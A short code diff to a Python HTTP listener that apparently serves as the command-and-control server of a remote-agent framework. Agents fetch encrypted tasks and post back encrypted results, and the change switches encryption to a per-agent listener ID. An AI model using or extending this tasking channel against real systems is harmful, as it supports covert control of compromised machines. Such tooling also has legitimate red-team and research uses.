@@ -11,7 +11,7 @@ TO DO:
 3- Implementing the encryption inside 
 '''
 
-class Listener(BaseHTTPRequestHandler, id):
+class Listener(BaseHTTPRequestHandler):
     def do_GET(self):
         #For testing
         if self.path == '/': 
@@ -35,12 +35,13 @@ class Listener(BaseHTTPRequestHandler, id):
         elif self.path.startswith('/task/') == True and len(os.path.split(self.path)) == 2:
             try: 
                 agentID = os.path.split(self.path)[1]
-                task = checkTask(agentID) 
+                task = checkTask(agentID)
+                listenerID = getAgentListener(agentID) 
                 self.send_response(200) 
                 self.end_headers() 
                 if(task): 
                     #---------------------------------------------------------
-                    cipher = encrypt(id,task)
+                    cipher = encrypt(listenerID,task)
                     self.wfile.write(bytes(cipher, 'utf-8'))
                     #---------------------------------------------------------
                 else: 
@@ -58,7 +59,8 @@ class Listener(BaseHTTPRequestHandler, id):
                 content_len = int(self.headers.get('content-length'))
                 #---------------------------------------------------------
                 cipher = self.rfile.read(content_len)
-                result = decrypt(id, cipher)
+                listenerID = getAgentListener(agentID)
+                result = decrypt(listenerID, cipher)
                 #---------------------------------------------------------
                 print('Received Task Results from agent #%s \n Result: %s' %(agentID, result))
                 writeResult(agentID, result)
